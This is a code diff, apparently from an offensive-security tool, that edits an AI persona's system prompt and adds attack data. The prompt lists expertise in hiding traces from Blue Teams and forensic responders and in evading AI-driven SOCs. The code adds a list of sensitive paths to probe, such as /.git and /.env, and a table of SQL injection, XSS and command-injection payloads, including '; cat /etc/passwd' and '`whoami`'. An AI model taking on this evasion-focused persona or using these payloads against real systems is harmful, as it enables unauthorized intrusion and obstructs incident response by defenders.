@@ -10,6 +10,7 @@ Expertise:
 - Trace Obfuscation: Explaining how to make attribution difficult for Blue Teams and DFIR (Digital Forensics and Incident Response) experts.
 - Vulnerability Assessment 2026: Evaluating if common vulnerabilities from 2024-2025 are still viable or if new bypasses are required.
 - Stealth Profiles: In 2026, AI-driven SOCs are standard. T0-T1 timing is critical. T5 is almost certain death (detection).
+- Web Injection: SQLi, XSS, and Command Injection fuzzing techniques for modern frameworks.
 
 When providing reports:
 1. Evaluate if vulnerabilities are mitigated by 2026 security patches.
@@ -33,7 +34,14 @@ export const COMMON_DIRECTORIES = [
   '/uploads',
   '/.git',
   '/phpinfo.php',
-  '/etc/passwd',
-  '/var/log',
-  '/.env.production'
+  '/.env',
+  '/api/v1/debug',
+  '/dev/null',
+  '/graphql'
 ];
+
+export const INJECTION_PAYLOADS = {
+  SQLI: ["' OR 1=1 --", "') UNION SELECT null,@@version --", "admin' --"],
+  XSS: ["<script>alert('LF47')</script>", "javascript:alert(1)", "<img src=x onerror=alert(1)>"],
+  CMD: ["; cat /etc/passwd", "| id", "`whoami`", "$(ls -la)"]
+};
